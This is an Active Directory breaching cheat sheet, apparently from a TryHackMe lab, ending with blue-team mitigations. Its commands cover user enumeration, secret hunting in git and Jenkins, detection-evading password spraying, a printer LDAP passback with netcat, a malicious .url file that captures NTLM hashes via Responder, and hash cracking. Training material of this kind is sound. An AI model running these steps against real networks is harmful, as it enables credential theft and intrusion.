# AD Breaching 

**Goal:** Go from zero access to a valid domain credential.

### 1. Username Enumeration (Kerbrute)

- **Why:** Kerberos pre-auth returns different errors for valid vs. invalid users. **Does not trigger account lockouts** (but logs Event 4768).
    
- **Format:** Generate lists using `first.last`, `flast`, `first`, etc.
    
    ```bash
    # Enumerate users against the DC
    kerbrute userenum -d thm.loc --dc 192.168.12.100 usernames.txt -o valid_users.txt
    
    # Clean the output for spraying later
    grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@thm.loc//' > clean_users.txt
    ```
    

### 2. Credential Discovery (Low-Hanging Fruit)

- **Git Repos (Commit History):**
    
    ```bash
    git log -p | grep -i "password\|secret\|token\|key\|credential"
    # Or use TruffleHog:
    trufflehog git file:///path/to/repo
    ```
    
- **Jenkins (Build Logs via API):**
    
    ```bash
    curl http://ci.thm.loc/job/JOB_NAME/lastBuild/consoleText | grep -i "password\|secret\|token\|credential"
    ```
    

### 3. Password Spraying (NetExec/nxc)

- **Why:** Try 1 password against many users to avoid lockouts.
    
- **CRITICAL STEP:** Check the lockout policy first (if you have valid creds).
    
    ```bash
    nxc smb 192.168.12.100 -u 'validuser' -p 'validpassword' --pass-pol
    ```
    
- **Spray:**
    
    ```bash
    nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success --jitter 2-5
    ```
    
    - `--continue-on-success`: Keeps going after finding a winner.
        
    - `--jitter 2-5`: Random delay to avoid detection.
        
    - _(Watch for `[+]` (success), `STATUS_LOGON_FAILURE` (wrong pass), and `STATUS_ACCOUNT_LOCKED_OUT` (stop immediately!))._
        

### 4. Coercion Attacks (Force Auth)

**A. LDAP Passback (Printers/IoT)**

- **Why:** Devices store LDAP creds. If you change the LDAP IP to yours, it sends you the plaintext password during a "Test Connection".
    
- **Exploit:**
    
    1. Open printer admin panel (default `admin:admin`).
        
    2. Change LDAP Server IP to your `tun0` IP, port `3489`.
        
    3. Start listener: `nc -lvnp 3489`
        
    4. Click "Test Connection" in the web panel.
        
    5. Read cleartext creds in Netcat.
        

**B. File-Based Coercion (Responder)**

- **Why:** Windows Explorer auto-renders icons. If a `.url` file points to your IP, Windows sends an NTLMv2 hash.
    
- **Exploit:**
    
    1. Create `@Shortcut.url` (Note the `@` to force it to the top of the folder):
        
        ```ini
        [InternetShortcut]
        URL=http://thm.loc
        WorkingDirectory=thm
        IconFile=\\YOUR_TUN0_IP\icons\icon.ico
        IconIndex=1
        ```
        
    2. Start Responder: `sudo responder -I tun0`
        
    3. Upload to writable SMB share:
        
        ```bash
        smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!'
        smb: \> put @Shortcut.url
        ```
        
    4. Wait for a user to browse the share. Catch the hash in Responder.
        
    5. Crack it offline:
        
        ```bash
        hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
        ```
        

### 5. DNS Recon (Quick Lookups)

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.thm.loc DC_IP
nslookup -type=SRV _kerberos._tcp.thm.loc DC_IP
nslookup -type=MX thm.loc DC_IP
```

### 6. Mitigations (What Blue Team should do)

- **LDAP:** Enforce LDAPS (port 636). Change default admin creds.
    
- **SMB:** Disable NTLMv1, enforce SMB signing, block outbound SMB (port 445).
    
- **Spraying:** Enforce 14+ character passwords, use banned password lists, set lockout to 5-10 attempts.
    
- **Secrets:** Use a vault (HashiCorp/AWS), scan commits with TruffleHog, rotate exposed creds immediately.
